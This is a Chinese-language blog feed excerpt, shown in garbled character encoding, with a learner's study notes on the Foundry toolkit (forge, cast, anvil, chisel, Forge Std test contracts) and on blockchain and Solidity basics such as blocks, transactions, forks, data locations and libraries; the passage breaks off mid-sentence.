        <content type="html"><![CDATA[<h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p>ä¸Šæ¬¡é‚£ä¸ª<a href="https://updraft.cyfrin.io/">ç½‘ç«™</a>,é‡Œé¢æœ‰è®²foundryï¼Œè™½ç„¶ä»¥å‰å­¦ä¹ è¿‡ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡èƒ½å…·ä½“å­¦ä¹ è¿‡ï¼Œåªä¼šä¸€äº›æµ‹è¯•çš„ç”¨æ³•ï¼Œå…¶ä»–é«˜æ·±çš„ç”¨æ³•è¿˜æ²¡æœ‰äº†è§£åˆ°ï¼Œå€Ÿæ­¤æœºä¼šå†æ¬¡å­¦ä¹ ä¸€ä¸‹ï¼Œå°±å†™äº†è¿™ä¸ªç¬”è®°</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>æ¨èè¿™ä¸ªç½‘ç«™<a href="https://book.getfoundry.sh/">Foundry-Book</a>;<br>å®‰è£…å®Œæˆåï¼Œåœ¨ç»ˆç«¯ä½¿ç”¨æŒ‡ä»¤ï¼šForge â€“version æŸ¥çœ‹æœ‰æ²¡æœ‰å®‰è£…å¥½ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå°±åˆ é™¤ä»å¤´å†æ¥ä¸€é</p><p>æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯windowsçš„ç³»ç»Ÿå°±è¦å»æ‰¾å±äºwindowå®‰è£…æ•™ç¨‹ï¼ˆæˆ‘å°±åå¤å®‰è£…ï¼Œåƒäº†å¾ˆå¤šäºï¼‰ï¼Œå¦‚æœä½ æƒ³ä½¿ç”¨windowsä¸Šçš„å­ç³»ç»ŸLinux,å°±å¯ä»¥åœ¨ä½ çš„ç»ˆç«¯ä½¿ç”¨ wsl â€“install ,ç„¶åé‡å¯å®‰è£…å³å¯</p><h2 id="ä½¿ç”¨-ï¼ˆforge-ï¼‰"><a href="#ä½¿ç”¨-ï¼ˆforge-ï¼‰" class="headerlink" title="ä½¿ç”¨ ï¼ˆforge ï¼‰"></a>ä½¿ç”¨ ï¼ˆforge ï¼‰</h2><p>æœ€å¼€å§‹æˆ‘è¿˜æ²¡æœ‰äº†è§£åˆ°æ€ä¹ˆè‡ªå·±ç”¨Foundryå…¨æ˜¯ä»ä»“åº“ git clone ä¸‹æ¥ï¼Œå®ƒè‡ªå¸¦Foundry,å°±ä¸éœ€è¦è‡ªå·±æ„å»ºæ–‡ä»¶å¤¹ã€‚ç°åœ¨å°±ä»‹ç»ä¸€ä¸‹æ€ä¹ˆæ„å»ºä¸€ä¸ªæ–‡ä»¶å¤¹åŒ…å«Foundryæµ‹è¯•æ¡†æ¶ã€‚ï¼ˆæ³¨æ„æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯VSCODEè¿™ä¸ªè½¯ä»¶ï¼Œéå¸¸å¥½ç”¨ï¼‰</p><ul><li>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œåœ¨git baseç»ˆç«¯ä¸Šè¾“å…¥ forge init æ–‡ä»¶å¤¹åå­—</li><li>è¿›å…¥æ–‡ä»¶å¤¹ cd æ–‡ä»¶å¤¹åå­— </li><li>å†æ„å»ºé¡¹ç›® forge build æˆ–åˆ™ forge compile</li><li>æµ‹è¯•æ—¶ä½¿ç”¨ forge test å¦‚æœè¦æµ‹è¯•ï¼Œæµ‹è¯•åˆçº¦ä¸­çš„ä¸€ä¸ªæµ‹è¯•å‡½æ•°ï¼Œæ˜¯å¯ä»¥ä½¿ç”¨è¿‡æ»¤æ¡ä»¶æ–¹æ³•ï¼šforge test â€“match-contract æµ‹è¯•åˆçº¦å â€“match-test æµ‹è¯•å‡½æ•°</li></ul><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><p>ä¸€äº›Castçš„æŒ‡ä»¤ï¼š</p><ul><li>è·å–å½“å‰é“¾çš„IDï¼šcast chain-id</li><li>è·å–å½“å‰å®¢æˆ·ç«¯ç‰ˆæœ¬ï¼šcast client</li><li>è·å–å½“å‰gasä»·æ ¼ï¼šcast gas-price</li><li>æŸ¥è¯¢æœ€æ–°çš„åŒºå—å·ï¼šcast block-number</li><li>è·å–å½“å‰çš„ç½‘ç»œåŸºç¡€è´¹ï¼šcast basefee</li><li>è·å–blockçš„è¯¦ç»†ä¿¡æ¯ï¼šcast block</li><li>è·å–åŒºå—çš„æ—¶é—´æˆ³ä¿¡æ¯ï¼šcast age</li><li>æŸ¥è¯¢ç‰¹å®šçš„ä»¥å¤ªåŠè´¦æˆ·åœ°å€ï¼šcast balance åœ°å€   å¦‚æœä¸çŸ¥é“åœ°å€ï¼Œå°±ä½¿ç”¨ENSæŸ¥è¯¢ï¼šcast balance vitalik.eth</li><li>æŸ¥çœ‹æºä»£ç ï¼šcast etherscan-source åœ°å€</li></ul><h2 id="anvil"><a href="#anvil" class="headerlink" title="anvil"></a>anvil</h2><p>å®ƒå¯ä»¥æä¾›ä¸€ä¸ªæ–¹ä¾¿æµ‹è¯•å’Œå¼€å‘çš„ä»¥å¤ªåŠèŠ‚ç‚¹<br>ä½¿ç”¨anvilæŒ‡ä»¤ï¼Œå®ƒå¯ä»¥è¾“å‡ºè´¦æˆ·ï¼Œç§é’¥ï¼Œé“¾IDï¼ŒåŸºæœ¬è´¹ç”¨ç­‰<br>é€šè¿‡ä½¿ç”¨anvil-h,å¯ä»¥æŸ¥çœ‹anvilæ‰€æœ‰çš„é…ç½®é€‰é¡¹<br>ä½¿ç”¨anvil -a æ•°é‡ï¼Œå¯ä»¥ç”ŸæˆæŒ‡å®šçš„æ•°é‡å¼€å‘è´¦æˆ·</p><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chiselæ˜¯ä¸€ä¸ªSolidity REPL,ç”¨äºç¼–å†™å’Œæµ‹è¯•Solidityä»£ç ç‰‡æ®µï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç”¨äºç¼–ç¨‹å’Œæ‰§è¡ŒASolidityä»£ç çš„äº¤äº’å¼ç¯å¢ƒ</p><h2 id="Forge-Std"><a href="#Forge-Std" class="headerlink" title="Forge Std"></a>Forge Std</h2><p>å®ƒæ˜¯Forgeæ ‡å‡†åº“ï¼Œä¸ºFoundryæ¡†æ¶æä¾›äº†ä¸°å¯Œçš„è¾…ç»„åˆçº¦ï¼Œç®€åŒ–å’ŒåŠ é€Ÿç¼–å†™æ™ºèƒ½åˆçº¦æµ‹è¯•çš„è¿‡ç¨‹å¹¶æå‡ç”¨æˆ·ä½“éªŒ<br>ä½¿ç”¨Forge Std åªéœ€è¦åœ¨æµ‹è¯•åˆçº¦å¯¼å…¥Test.solå¹¶ç»§æ‰¿Test</p><p>æ ¸å¿ƒåŠŸèƒ½ï¼š<br>è®¿é—®Hevm:é€šè¿‡vmå®ä¾‹ç›´æ¥ä½¿ç”¨ï¼Œcheatcodeæ¨¡æ‹Ÿå„ç§åŒºå—é“¾çŠ¶æ€å’Œè¡Œä¸º</p><blockquote><p>Hevmæ˜¯DappHubå›¢é˜Ÿå¼€å‘çš„ä»¥å¤ªåŠè™šæ‹Ÿæœºå®ç°ï¼Œä¸“é—¨ç”¨äºæµ‹è¯•å’Œè°ƒè¯•æ™ºèƒ½åˆçº¦ï¼Œå®ƒæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥æ¨¡æ‹Ÿä»¥å¤ªåŠç½‘ç»œçš„è¡Œä¸ºï¼Œå…è®¸å¼€å‘äººå‘˜åœ¨æœ¬åœ°æ‰§è¡Œæµ‹è¯•å’Œè°ƒè¯•å®ƒä»¬çš„åˆçº¦ï¼Œè€Œæ— éœ€è¿æ¥åˆ°å®é™…çš„ä»¥å¤ªåŠç½‘ç»œ<br>æ–­è¨€å’Œæ—¥å¿—ï¼šä»Dappsys Test ç»§æ‰¿ï¼Œå…·æœ‰æ–­è¨€åŠŸèƒ½å’Œä¸€Hardhatä¸ºé£æ ¼çš„æ—¥å¿—è®°å½•<br>æ ‡å‡†åº“åŠŸèƒ½ï¼šForge Std æä¾›çš„æ ‡å‡†åº“åŒ…æ‹¬å„ç§å®ç”¨çš„å·¥å…·å’ŒåŠŸèƒ½ï¼Œä¾‹å¦‚ï¼Œå‘æŒ‡å®šè´¦æˆ·å‘é€ä»£å¸</p></blockquote><p>åœ¨Forgeæ ‡å‡†åº“çš„æµ‹è¯•åˆçº¦ä¸­ï¼Œé€šè¿‡vmå®ä¾‹å¯ä»¥æ–¹ä¾¿çš„è®¿é—®ä½œå¼Šç <br>ä¾‹å¦‚ï¼šèº«ä»½è½¬åŒ–ï¼švm.prank;ä½¿ç”¨vm.prank()å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æš‚æ—¶åˆ‡æ¢è°ƒç”¨è€…çš„èº«ä»½</p><h2 id="ç¼–å†™æµ‹è¯•åˆçº¦"><a href="#ç¼–å†™æµ‹è¯•åˆçº¦" class="headerlink" title="ç¼–å†™æµ‹è¯•åˆçº¦"></a>ç¼–å†™æµ‹è¯•åˆçº¦</h2><p>å¿…è¦å·¥ä½œï¼Œå¯¼å…¥ï¼šimport â€œforge-std&#x2F;Test.solâ€<br>setUPå‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå¯é€‰å‡½æ•°ï¼Œåœ¨è¿è¡Œæµ‹è¯•ç”¨ä¾‹ä¹‹å‰è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–æµ‹è¯•ç¯å¢ƒ<br>ä»¥testä¸ºå‰ç¼€çš„å‡½æ•°å°†è¢«è¯†åˆ«ä¸ºæµ‹è¯•ç”¨ä¾‹å¹¶æ‰§è¡Œ<br>testFailå‡½æ•°ï¼Œç”¨äºæŒ‡ç¤ºé¢„æœŸçš„æµ‹è¯•å¤±è´¥ï¼Œå¦‚æœæ­¤å‡½æ•°æœªè§¦å‘è¿˜åŸï¼Œåˆ™æµ‹è¯•å¤±è´¥</p><p>è¿˜æœ‰ä¸€äº›é«˜çº§çš„æµ‹è¯•æŠ€æœ¯ï¼šexpectRevertï¼šå®ƒæ˜¯è¿›è¡Œç²¾å‡†çš„é”™è¯¯å¤„ç†ï¼Œä¾‹å¦‚,vm.expectRevert(Some.Error.selector) &#x2F;&#x2F;å¯è§¦å‘SomeErrorä¸€äº›é”™è¯¯</p><p>å…±äº«è®¾ç½®ï¼šé€šè¿‡åˆ›å»ºæŠ½è±¡åˆçº¦å¹¶åœ¨æµ‹è¯•åˆçº¦ä¸­ç»§æ‰¿å®ƒï¼Œå¯ä»¥è®¾ç½®å…±äº«ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract contract SetupHelper &#123;</span><br><span class="line">    // Shared setup codes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyTest is Test, SetupHelper &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // Shared setup</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å…±äº«è®¾ç½®å¯ä»¥é¿å…åœ¨æ¯ä¸ªæµ‹è¯•åˆçº¦ä¸­é‡å¤ç›¸åŒçš„åˆå§‹åŒ–ä»£ç ï¼Œæé«˜ä»£ç çš„å¯é‡ç”¨æ€§å’Œå¯ç»´æŠ¤æ€§</p><p>å¯¼å…¥æ–‡ä»¶ï¼Œç”¨<br>import â€œforge-std&#x2F;Test.solâ€<br>è¿™ä¸ªæ˜¯å¿…è¦çš„</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒºå—é“¾çŸ¥è¯†å·©å›º</title>
      <link href="/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/"/>
      <url>/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘åˆ«äººåˆ†äº«äº†ä¸€ä¸ªç½‘ç«™ï¼Œå¯¹äºä¸€äº›çŸ¥è¯†å·©å›ºæˆ‘è§‰å¾—æŒºå¥½çš„</p><p>ç½‘ç«™é“¾æ¥æˆ‘å°±æ”¾åœ¨<a href="https://updraft.cyfrin.io/">è¿™é‡Œ</a></p><p>å­¦ä¹ è¿™ä¸ªç½‘ç«™ï¼Œæˆ‘å°±åœ¨è¿™ä¸ªåšå®¢ä¸Šåˆ†äº«ä¸€äº›æˆ‘çš„ç¬”è®°</p><h2 id="ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†"><a href="#ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†" class="headerlink" title="ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†"></a>ä¸€ï¼ŒåŸºæœ¬å¸¸è¯†</h2><p>1ï¼ŒOracle: å°±æ˜¯å……å½“åŒºå—é“¾ä¸å¤–éƒ¨ä¸–ç•Œè”ç³»çš„ä¸­ä»‹ï¼Œå…è®¸æ™ºèƒ½åˆçº¦ä¸çœŸå®ä¸–ç•Œäº¤äº’æ•°æ®<br>2ï¼ŒLayer2: å®ƒæ˜¯æ„å»ºåœ¨Laryer1ä¹‹ä¸Šçš„æŠ€æœ¯ï¼Œå®ƒå¯ä»¥æé«˜åŒºå—é“¾äº¤æ˜“çš„æ‰©å±•æ€§å’Œæ•ˆç‡ï¼Œå®ƒé€šå¸¸åœ¨äº¤æ˜“ä¹‹å¤–æ‰§è¡Œï¼Œå°±æ˜¯ä¸ºäº†é¿å…äº¤æ˜“æ‹¥æŒ¤å’Œä¸€äº›è´¹ç”¨äº§ç”Ÿï¼Œå¦‚æ¯”ç‰¹å¸é—ªç”µç½‘ç»œ<br>3ï¼ŒDAPPï¼šå»ä¸­å¿ƒåŒ–çš„åº”ç”¨ï¼Œé€šå¸¸åœ¨åŒºå—é“¾ä¸Šè¿è¡Œï¼Œå°±ç±»æ¯”æˆ‘ä»¬ç°å®ç”Ÿæ´»ä¸­çš„appï¼Œå°±æ˜¯åº”ç”¨<br>4ï¼Œæ™ºèƒ½åˆçº¦ï¼šå®ƒä½¿è‡ªåŠ¨æ‰§è¡Œçš„åˆçº¦ï¼Œåœ¨åŒºå—é“¾ä¸Šè¿è¡Œ<br>5,web3: å®ƒæ˜¯ä¸€ä¸ªæœªè·è®¸å¯ä¾èµ–äºå»ä¸­å¿ƒåŒ–çš„ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæœ¯è¯­ï¼Œå®ƒå¼€åˆ›äº†ä¸€ä¸ªæŠ—å®¡æŸ¥å’Œé€æ˜åè®®å’Œäº¤æ˜“çš„ä¸€ä¸ªé¢†åŸŸ<br>6ï¼ŒChainlink: å®ƒä¸åŒºå—é“¾ä¸Šçš„é¢„è¨€æœºï¼Œå®ƒé€šè¿‡é“¾ä¸Šçš„é€»è¾‘å’Œé“¾ä¸‹çš„æ•°æ®å’Œè®¡ç®—ï¼Œç¡®ä¿è¿™ä¸ªé€»è¾‘å’Œè¿™ä¸ªæ•°æ®ä¿æŒå»ä¸­å¿ƒåŒ–<br>7ï¼Œä¸€ä¸ªåŒºå—åŒ…æ‹¬ï¼ŒåŒºå—å¤´ï¼ŒåŒºå—ä½“</p><blockquote><p>åŒºå—å¤´ï¼šnonce(äº¤æ˜“çš„è®¡æ•°),å‰ä¸€ä¸ªå“ˆå¸Œå€¼ï¼ˆæ³¨æ„ï¼šåˆ›ä¸–åŒºå—æ²¡æœ‰çˆ¶å“ˆå¸Œå€¼ï¼‰æ—¶é—´æˆ³ï¼Œä¸‰ä¸ªæ ‘æ ¹ï¼ˆçŠ¶æ€æ ‘æ ¹ï¼šè®°å½•æ‰€æœ‰è´¦æˆ·çš„ä½™é¢ï¼Œä¿¡æ¯ç­‰ï¼Œäº¤æ˜“æ ‘æ ¹ï¼Œæ”¶æ®æ ‘æ ¹ï¼Œå¸åŸºï¼ˆè¯†åˆ«çŸ¿å·¥çš„åœ°å€ï¼‰ï¼Œéš¾åº¦ç›®æ ‡ï¼ˆè¡¨ç¤ºæŒ–çŸ¿çš„éš¾åº¦ï¼‰</p></blockquote><blockquote><p>åŒºå—ä½“ï¼šåŒ…å«äº†è¿™ä¸ªåŒºå—çš„æ‰€æœ‰äº¤æ˜“å“ˆå¸Œå€¼</p></blockquote><p>8ï¼Œä»¥ä»¥å¤ªåŠä¸ºä¾‹ï¼šä»ä¸Šåˆ°ä¸‹åˆ†ä¸ºï¼šåŒºå—é“¾ï¼ŒåŒºå—ï¼Œäº¤æ˜“</p><blockquote><p>äº¤æ˜“ï¼šä¸€ä¸ªè´¦æˆ·å‘å¦ä¸€ä¸ªè´¦æˆ·å‘é€ä¿¡æ¯çš„è¡Œä¸ºï¼Œå½“å‘èµ·äº¤æ˜“æ—¶ï¼Œä»¥å¤ªåŠå®¢æˆ·ç«¯æˆ–è€…é’±åŒ…ä¼šç”Ÿæˆäº¤æ˜“æ•°æ®.äº¤æ˜“æ•°æ®åŒ…æ‹¬ï¼šnonce(å‘é€æ–¹çš„äº¤æ˜“æ•°é‡)ï¼ŒgasPrice(å‘é€æ–¹æ„¿æ„æ”¯ä»˜çš„gasè´¹ç”¨)ï¼ŒgasLimit(å‘é€æ–¹è®¾ç½®æœ¬æ¬¡æœ€å¤§çš„gasè´¹ç”¨)ï¼Œto(æ¥æ”¶æ–¹çš„åœ°å€)ï¼Œvalue(è¦å‘é€çš„é’±)ï¼Œdata(æ™ºèƒ½åˆçº¦çš„å­—èŠ‚ç )ï¼Œv r s (äº¤æ˜“çš„ç­¾åï¼Œåˆå‘é€æ–¹çš„ç§é’¥äº§ç”Ÿ)<br>9ï¼Œè½¯ç¡¬åˆ†å‰ï¼šä»å­—é¢ä¸Šç†è§£ï¼Œå°±æ˜¯ä¸€ä¸ªå¦¥åï¼Œä¸€ä¸ªå¼ºç¡¬ï¼ŒåŒºå—é“¾ä¸Šçš„è½¯ç¡¬åˆ†å‰æ­£æ˜¯å› ä¸ºæ—¶ä»£çš„æ›´æ–°ï¼Œé“¾ä¸Šå‡ºç°äº†åˆ†æ­§ï¼Œé‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Œè¿™æ˜¯å°±å‡ºç°äº†åˆ†å‰ï¼Œä»é¡¹ç›®ä¸Šæ¥è¯´ï¼Œä¸€ä¸ªé¡¹ç›®çš„åˆ†å‰ï¼ˆforkï¼‰ï¼Œåˆ†ä¸ºä¸€ä¸ªå­é¡¹ç›®ï¼Œé‚£ä¹ˆå¼€å‘äººå‘˜å°±ä¼šåˆ†åˆ«è¿›è¡Œè¿™ä¿©ä¸ªé¡¹ç›®ï¼Œä½†æ˜¯åŒºå—é“¾ä¸Šï¼Œå°±ä¸åŒï¼Œå°±å‡ºç°äº†ä¿©ç§æ¦‚å¿µ</p></blockquote><ul><li>è½¯åˆ†å‰ï¼šå‘å‰å…¼å®¹ï¼Œæ—§ç‰ˆæœ¬æ¥å—æ–°ç‰ˆæœ¬çš„ä¸œè¥¿ï¼Œä½†æ˜¯åœ¨æ—§ç‰ˆæœ¬çš„ç®—åŠ›è¦å¤§äº51%ï¼Œæ‰èƒ½äº§ç”Ÿè½¯åˆ†å‰ï¼Œæœ€åé“¾æ¯”è¾ƒé•¿çš„ä¿ç•™</li><li>ç¡¬åˆ†å‰ï¼šä¸å…¼å®¹ï¼Œæ—§ç‰ˆæœ¬å’Œæ–°ç‰ˆæœ¬æ˜¯å®Œå…¨åˆ†å¼€çš„ï¼Œå®ƒä¸éœ€è¦ç®—åŠ›å¤§äº51%ï¼ˆå› ä¸ºå³ä½¿æ—§ç‰ˆæœ¬çš„é“¾é•¿äºæ–°ç‰ˆæœ¬ï¼Œä½†æ˜¯ä¹Ÿä¸å½±å“æ–°ç‰ˆæœ¬ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬ä¸ä¼šæ¥å—æ—§ç‰ˆæœ¬çš„ä¸œè¥¿ï¼Œè€Œæ—§ç‰ˆæœ¬å¤œä¹Ÿä¸ä¼šæ¥å—æ–°ç‰ˆæœ¬çš„ä¸œè¥¿ï¼‰,ç›´æ¥äº§ç”Ÿç¡¬åˆ†å‰</li></ul><h2 id="äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º"><a href="#äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º" class="headerlink" title="äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º"></a>äºŒï¼Œsolidityçš„çŸ¥è¯†æŸ¥æ¼è¡¥ç¼º</h2><p>1ï¼Œæˆ‘æ„Ÿè§‰å­¦äº†Javaçš„è¯ä¼šå¾ˆå¥½ç†è§£ã€‚<br>2ï¼Œä½¿ç”¨ç»“æ„ä½“æ—¶ï¼Œé‡‡ç”¨å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¦‚æœå¯¹è±¡å¾ˆå¤šï¼Œå°±é‡‡ç”¨åŠ¨æ€æ•°ç»„ï¼Œè¿™æ ·å°±æ¯”è¾ƒæ–¹ä¾¿<br>  eg,å®šä¹‰ä¸€ä¸ªåPersonçš„ç»“æ„ä½“ï¼Œç”¨Person[] list_of_people ,é‚£ä¹ˆlist_of_peopleæ•°ç»„å°±å¯ä»¥å‚¨å­˜å¤šä¸ªPersonå¯¹è±¡<br>3ï¼Œæ³¨æ„åˆ°äº†ä¸€ä¸ªæ™ºèƒ½é—®ç­”å°åŠ©æ‰‹ï¼Œåä¸º<a href="https://www.phind.com/search?home=true">phind</a>,å°±æ˜¯å¯ä»¥ç”¨å®ƒæ¥æ£€æŸ¥ä½ çš„åˆçº¦æ˜¯å¦ç¼ºé€—å·é—®é¢˜å•¥çš„<br>4ï¼Œæ•°æ®å‚¨å­˜ï¼šcalldataï¼Œå®ƒæ˜¯åªèƒ½è¯»ï¼Œä¸èƒ½è°ƒç”¨ä½¿ç”¨ã€‚ä½†æ˜¯åœ¨åˆçº¦ä¸­å†…å­˜memoryå¯ä»¥å…è®¸è¯»å†™ï¼Œè®©å˜é‡æ”¹å˜åœ¨å‡½æ•°ä¸­ï¼Œä¸ºäº†ä¿®æ”¹calldataæˆ‘ä»¬å¿…é¡»å…ˆå°†å®ƒå‚¨å­˜åˆ°å†…å­˜memoryä¸­ã€‚calldataå’Œmemoryï¼Œéƒ½æ˜¯ä¸´æ—¶å‚¨å­˜å˜é‡ã€‚Storageå‚¨å­˜å˜é‡ï¼Œå®ƒæ˜¯æŒä¹…çš„å‚¨å­˜åœ¨åŒºå—é“¾ä¸Šï¼Œè¢«å¤–éƒ¨è°ƒç”¨æ—¶ä¼šä¿ç•™å®ƒä»¬çš„å€¼ï¼Œä»»ä½•åœ¨å‡½æ•°å¤–éƒ¨å£°æ˜çš„å˜é‡éƒ½ä¼šéšå¼çš„è½¬åŒ–å‚¨å­˜å˜é‡ï¼Œä½†æ˜¯ä¸èƒ½åœ¨å‡½æ•°ä¸­å®šä¹‰ä½¿ç”¨Storage,åªèƒ½ä½¿ç”¨calldataå’Œmemoryã€‚<br>5ï¼Œæ˜ å°„ï¼Œåœ¨å‰é¢æˆ‘ä»¬ä¹Ÿäº†è§£åˆ°ï¼Œç”¨åŠ¨æ€æ•°ç»„å‚¨å­˜Personå¯¹è±¡ï¼Œä½†æ˜¯å¦‚æœæœ‰å¾ˆå¤šå¯¹è±¡ï¼Œè€Œæˆ‘ä»¬è¦æ‰¾å…¶ä¸­ä¸€ä¸ªï¼Œå°±å¿…é¡»ä»å¤´å†éï¼Œè¿™æ ·å°±ä¼šä½·éº»çƒ¦ï¼Œæ‰€ä»¥å°±å‡ºç°äº†æ˜ å°„ï¼Œæ„é€ ä¸€ä¸ªæ˜ å°„å¯¹è±¡ï¼Œå°†ä¸€ä¸ªå˜é‡å’Œå¦ä¸€ä¸ªå˜é‡è”ç³»èµ·æ¥ï¼Œæä¾›å™¶æˆ‘ä»¬çš„æŸ¥æ‰¾æ•ˆç‡<br>6ï¼Œåˆçº¦å®ä¾‹éƒ¨ç½²ï¼Œä½¿ç”¨newå…³é”®å­—ï¼Œç±»ä¼¼äºjavaçš„ç†è§£ã€‚é¦–å…ˆä½ å°†è¦éƒ¨ç½²çš„åˆçº¦Aå’Œæˆ‘ä»¬çš„å·¥å‚åˆçº¦Bæ”¾åœ¨ä¸€èµ·ï¼Œç„¶ååœ¨å·¥å‚åˆçº¦Bä¸­ç”¨Aå®šä¹‰aï¼Œå†å®šä¹‰ä¸€ä¸ªå‡½æ•°createï¼Œé‡Œé¢å†™a&#x3D;new A();è¿™æ ·ä¸€ä¸ªåˆçº¦å®ä¾‹å°±éƒ¨ç½²å‡ºæ¥äº†ï¼Œæ²¡ä½¿ç”¨createçš„æ—¶å€™ï¼Œå¯ä»¥çœ‹è§açš„åœ°å€ä¸º0ï¼Œä½¿ç”¨åå°±å¯ä»¥å‘ç°aå°±æœ‰åœ°å€äº†ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ï¼Œæˆ‘ä»¬æŠŠåˆçº¦Aéƒ¨ç½²å‡ºæ¥äº†ï¼Œè¿˜æœ‰ä¸€ç§ç®€å•çš„æ–¹æ³•ï¼Œé‡‡ç”¨importå…³é”®å­—ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨æŠŠåˆçº¦Aå’Œåˆçº¦Bå†™åœ¨ä¸€èµ·äº†ï¼Œç›´æ¥å°±æ˜¯improtâ€.&#x2F;Aâ€</p><blockquote><p>importçš„ä½¿ç”¨æ–¹æ³•ï¼šå¦‚æœè¦å¯¼å…¥çš„åˆçº¦åªåŒ…å«ä¸€ä¸ªåˆçº¦ï¼Œå°±å¯ä»¥ç›´æ¥ä½¿ç”¨ importâ€.&#x2F;â€œ,å¦‚æœæ˜¯è¦å¯¼å…¥çš„åˆçº¦ä¸­åŒ…æ‹¬å¾ˆå¤šç§åˆçº¦ï¼Œç„¶åä½ è¦ä½¿ç”¨å“ªç§åˆçº¦ï¼Œå°±åœ¨{}é‡Œå†™ï¼Œåœ¨â€ â€œå†™æ¥æºï¼Œå°±æ˜¯å¤§åˆçº¦ï¼Œimport {A,B} from â€œ.&#x2F;Aâ€;</p></blockquote><p>7ï¼Œç»§æ‰¿äºé‡å†™ï¼šä¿©ä¸ªå…³é”®å­— overrideï¼Œvirtualï¼Œä¾‹å¦‚A is B{}ï¼›Aåˆçº¦ç»§æ‰¿Båˆçº¦ï¼Œæˆ‘ä»¬è¦ä¿®æ”¹Aä¸­ç»§æ‰¿Båˆçº¦çš„å‡½æ•°ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±è¦åœ¨Aåˆçº¦ä¸­è¦ä¿®æ”¹çš„å‡½æ•°åŠ ä¸Šoverrideå…³é”®å­—ï¼Œåœ¨Båˆçº¦è¢«ä¿®æ”¹çš„å‡½æ•°ä¸­åŠ ä¸Švritualå…³é”®å­—ï¼Œè¿™æ ·å°±ä¸ä¼šæŠ¥é”™<br>8ï¼Œä¸€ä¸ªå¯ä»¥è®¡ç®—ï¼Œwei,Gwei,Ether,ä¹‹é—´çš„è½¬åŒ–çš„å·¥å…·ï¼š<a href="https://eth-converter.com/">Converter</a>;<br>9,gas:äº¤æ˜“æ‰€äº§ç”Ÿçš„æ‰‹æœ¯è´¹ï¼Œå¦‚æœä¸€ä¸ªäº¤æ˜“è¢«revertäº†ï¼Œé‚£ä¹ˆå®ƒçš„gaså°±ä¸ä¼šè¿”å›ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä»¥å¤ªåŠå°±æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œè‡ªå·±è®¾ç½®èƒ½æ‰¿æ‹…çš„æœ€å¤§gasè´¹ç”¨<br>10ï¼Œåº“ï¼šçœŸçš„æ˜¯æŸ¥æ¼è¡¥ç¼ºäº†ï¼Œè¿™ä¸ªåº“ï¼Œæˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡äº†è§£åˆ°ï¼Œåº“å°±æ˜¯ä¸ºäº†ç®€åŒ–æ™ºèƒ½åˆçº¦ï¼Œä½¿ç”¨Libraryå…³é”®å­—ï¼Œå®šä¹‰ä¸€ä¸ªMathçš„åº“ï¼ŒLibrary Math{};é‡Œé¢å°±æ”¾å‡½æ•°ï¼Œåœ¨å…¶ä»–åˆçº¦ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨åº“.å‡½æ•°åï¼Œç›´æ¥è¿›è¡Œè°ƒç”¨ï¼Œæˆ–è€…ä½¿ç”¨use for ,ä¾‹å¦‚è¦åœ¨åˆçº¦ä¸­uintç±»å‹çš„å˜é‡å¯ä»¥ä½¿ç”¨Mathåº“ï¼Œå°±ç›´æ¥use Math for uint;è¿™æ 